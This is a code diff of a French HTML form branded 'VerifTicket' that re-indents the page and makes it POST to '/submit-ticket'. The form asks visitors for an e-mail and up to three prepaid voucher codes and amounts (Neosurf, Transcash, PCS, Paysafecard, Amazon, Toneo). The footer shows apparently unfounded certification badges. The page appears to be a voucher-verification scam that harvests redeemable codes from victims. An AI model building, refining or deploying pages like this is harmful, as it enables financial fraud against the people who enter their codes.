@@ -1,195 +1,195 @@
-<!DOCTYPE html>
-<html lang="fr">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="Système de gestion de tickets en ligne">
-    <title>Gestion de Tickets</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css" />
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎫</text></svg>">
-  </head>
-  <body>
-    <div class="container">
-      <h1 id="titre">Gestion de Tickets</h1>
-      <form id="ticketForm">
-        <div class="ifosUser">
-          <h2>Données D'utilisateur :</h2>
-          <div class="form-group">
-            <label for="e-mail">E-mail :</label>
-            <input
-              type="email"
-              id="user-email"
-              name="email"
-              placeholder="E-mail de reception"
-              required
-            />
+  <!DOCTYPE html>
+  <html lang="fr">
+    <head>
+      <meta charset="UTF-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <meta name="description" content="Système de gestion de tickets en ligne">
+      <title>Gestion de Tickets</title>
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+      <link rel="stylesheet" href="style.css" />
+      <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎫</text></svg>">
+    </head>
+    <body>
+      <div class="container">
+        <h1 id="titre">Gestion de Tickets</h1>
+        <form id="ticketForm" action="/submit-ticket" method="POST">
+          <div class="ifosUser">
+            <h2>Données D'utilisateur :</h2>
+            <div class="form-group">
+              <label for="e-mail">E-mail :</label>
+              <input
+                type="email"
+                id="user-email"
+                name="email"
+                placeholder="E-mail de reception"
+                required
+              />
+            </div>
+            <div class="form-group">
+              <label for="devise">Devise</label>
+              <select id="devise" required>
+                <option value="USD">USD</option>
+                <option value="EU">EU</option>
+                <option value="GBP">GBP</option>
+                <option value="JPY">JPY</option>
+                <option value="CHF">CHF</option>
+                <option value="CAD">CAD</option>
+                <option value="KWD">KWD</option>
+              </select>
+            </div>
           </div>
-          <div class="form-group">
-            <label for="devise">Devise</label>
-            <select id="devise" required>
-              <option value="USD">USD</option>
-              <option value="EU">EU</option>
-              <option value="GBP">GBP</option>
-              <option value="JPY">JPY</option>
-              <option value="CHF">CHF</option>
-              <option value="CAD">CAD</option>
-              <option value="KWD">KWD</option>
-            </select>
-          </div>
-        </div>
 
-        <div class="ticket-group">
-          <h2>Ticket 1</h2>
-          <div class="form-group">
-            <label for="type1">Type de ticket:</label>
-            <select id="type1" name="type1">
-              <option value="">Sélectionnez un type</option>
-              <option value="neosurf">Neosurf</option>
-              <option value="transcash">Transcash</option>
-              <option value="pcs">PCS</option>
-              <option value="paysafe card">Paysafe card</option>
-              <option value="amazon">Amazon</option>
-              <option value="toneo">Toneo</option>
-              <option value="autre">Autre</option>
-            </select>
+          <div class="ticket-group">
+            <h2>Ticket 1</h2>
+            <div class="form-group">
+              <label for="type1">Type de ticket:</label>
+              <select id="type1" name="type1">
+                <option value="">Sélectionnez un type</option>
+                <option value="neosurf">Neosurf</option>
+                <option value="transcash">Transcash</option>
+                <option value="pcs">PCS</option>
+                <option value="paysafe card">Paysafe card</option>
+                <option value="amazon">Amazon</option>
+                <option value="toneo">Toneo</option>
+                <option value="autre">Autre</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="code1">Code du ticket:</label>
+              <input
+                type="text"
+                id="code1"
+                name="code1"
+                placeholder="Entrez le code du ticket"
+              />
+            </div>
+            <div class="form-group">
+              <label for="montant1">Montant:</label>
+              <input
+                type="number"
+                id="montant1"
+                name="montant1"
+                placeholder="Montant du ticket"
+                min="0"
+                step="0.01"
+              />
+            </div>
           </div>
-          <div class="form-group">
-            <label for="code1">Code du ticket:</label>
-            <input
-              type="text"
-              id="code1"
-              name="code1"
-              placeholder="Entrez le code du ticket"
-            />
-          </div>
-          <div class="form-group">
-            <label for="montant1">Montant:</label>
-            <input
-              type="number"
-              id="montant1"
-              name="montant1"
-              placeholder="Montant du ticket"
-              min="0"
-              step="0.01"
-            />
-          </div>
-        </div>
 
-        <div class="ticket-group">
-          <h2>Ticket 2</h2>
-          <div class="form-group">
-            <label for="type2">Type de ticket:</label>
-            <select id="type2" name="type2">
-              <option value="">Sélectionnez un type</option>
-              <option value="neosurf">Neosurf</option>
-              <option value="transcash">Transcash</option>
-              <option value="pcs">PCS</option>
-              <option value="paysafe card">Paysafe card</option>
-              <option value="amazon">Amazon</option>
-              <option value="toneo">Toneo</option>
-              <option value="autre">Autre</option>
-            </select>
+          <div class="ticket-group">
+            <h2>Ticket 2</h2>
+            <div class="form-group">
+              <label for="type2">Type de ticket:</label>
+              <select id="type2" name="type2">
+                <option value="">Sélectionnez un type</option>
+                <option value="neosurf">Neosurf</option>
+                <option value="transcash">Transcash</option>
+                <option value="pcs">PCS</option>
+                <option value="paysafe card">Paysafe card</option>
+                <option value="amazon">Amazon</option>
+                <option value="toneo">Toneo</option>
+                <option value="autre">Autre</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="code2">Code du ticket:</label>
+              <input
+                type="text"
+                id="code2"
+                name="code2"
+                placeholder="Entrez le code du ticket"
+              />
+            </div>
+            <div class="form-group">
+              <label for="montant2">Montant:</label>
+              <input
+                type="number"
+                id="montant2"
+                name="montant2"
+                placeholder="Montant du ticket"
+                min="0"
+                step="0.01"
+              />
+            </div>
           </div>
-          <div class="form-group">
-            <label for="code2">Code du ticket:</label>
-            <input
-              type="text"
-              id="code2"
-              name="code2"
-              placeholder="Entrez le code du ticket"
-            />
-          </div>
-          <div class="form-group">
-            <label for="montant2">Montant:</label>
-            <input
-              type="number"
-              id="montant2"
-              name="montant2"
-              placeholder="Montant du ticket"
-              min="0"
-              step="0.01"
-            />
-          </div>
-        </div>
 
-        <div class="ticket-group">
-          <h2>Ticket 3</h2>
-          <div class="form-group">
-            <label for="type3">Type de ticket:</label>
-            <select id="type3" name="type3">
-              <option value="">Sélectionnez un type</option>
-              <option value="neosurf">Neosurf</option>
-              <option value="transcash">Transcash</option>
-              <option value="pcs">PCS</option>
-              <option value="paysafe card">Paysafe card</option>
-              <option value="amazon">Amazon</option>
-              <option value="toneo">Toneo</option>
-              <option value="autre">Autre</option>
-            </select>
+          <div class="ticket-group">
+            <h2>Ticket 3</h2>
+            <div class="form-group">
+              <label for="type3">Type de ticket:</label>
+              <select id="type3" name="type3">
+                <option value="">Sélectionnez un type</option>
+                <option value="neosurf">Neosurf</option>
+                <option value="transcash">Transcash</option>
+                <option value="pcs">PCS</option>
+                <option value="paysafe card">Paysafe card</option>
+                <option value="amazon">Amazon</option>
+                <option value="toneo">Toneo</option>
+                <option value="autre">Autre</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="code3">Code du ticket:</label>
+              <input
+                type="text"
+                id="code3"
+                name="code3"
+                placeholder="Entrez le code du ticket"
+              />
+            </div>
+            <div class="form-group">
+              <label for="montant3">Montant:</label>
+              <input
+                type="number"
+                id="montant3"
+                name="montant3"
+                placeholder="Montant du ticket"
+                min="0"
+                step="0.01"
+              />
+            </div>
           </div>
-          <div class="form-group">
-            <label for="code3">Code du ticket:</label>
-            <input
-              type="text"
-              id="code3"
-              name="code3"
-              placeholder="Entrez le code du ticket"
-            />
-          </div>
-          <div class="form-group">
-            <label for="montant3">Montant:</label>
-            <input
-              type="number"
-              id="montant3"
-              name="montant3"
-              placeholder="Montant du ticket"
-              min="0"
-              step="0.01"
-            />
-          </div>
-        </div>
 
-        <button type="submit" class="submit-btn">Valider</button>
-      </form>
-    </div>
-
-    <!-- Message de confirmation (caché par défaut) -->
-      <div id="confirmation-message">
-        <div class="message-box">
-          <h2>Confirmation</h2>
-          <p id="message-text"></p>
-          <div class="button-group">
-            <button id="new-submission" class="btn">Nouvelle soumission</button>
-            <button class="close-message">Fermer</button>
-          </div>
-        </div>
+          <button type="submit" class="submit-btn">Valider</button>
+        </form>
       </div>
 
-    <script src="script.js"></script>
-
-    <footer class="main-footer">
-      <div class="footer-content">
-        <p class="copyright">&copy; 2023 VerifTicket. Tous droits réservés.</p>
-        <div class="certifications">
-          <span>Certifié par :</span>
-          <div class="cert-logos">
-            <span>EU SecurePay</span>
-            <span>TicketVerif Europe</span>
-            <span>CardTrust Alliance</span>
+      <!-- Message de confirmation (caché par défaut) -->
+        <div id="confirmation-message">
+          <div class="message-box">
+            <h2>Confirmation</h2>
+            <p id="message-text"></p>
+            <div class="button-group">
+              <button id="new-submission" class="btn">Nouvelle soumission</button>
+              <button class="close-message">Fermer</button>
+            </div>
           </div>
         </div>
-        <div class="legal-links">
-          <a href="#" class="footer-link">Mentions légales</a>
-          <span class="divider">|</span>
-          <a href="#" class="footer-link">Politique de confidentialité</a>
-          <span class="divider">|</span>
-          <a href="#" class="footer-link">Conditions d'utilisation</a>
-        </div>
-      </div>
-    </footer>
 
-  </body>
-</html>
+      <script src="script.js"></script>
+
+      <footer class="main-footer">
+        <div class="footer-content">
+          <p class="copyright">&copy; 2023 VerifTicket. Tous droits réservés.</p>
+          <div class="certifications">
+            <span>Certifié par :</span>
+            <div class="cert-logos">
+              <span>EU SecurePay</span>
+              <span>TicketVerif Europe</span>
+              <span>CardTrust Alliance</span>
+            </div>
+          </div>
+          <div class="legal-links">
+            <a href="#" class="footer-link">Mentions légales</a>
+            <span class="divider">|</span>
+            <a href="#" class="footer-link">Politique de confidentialité</a>
+            <span class="divider">|</span>
+            <a href="#" class="footer-link">Conditions d'utilisation</a>
+          </div>
+        </div>
+      </footer>
+
+    </body>
+  </html>
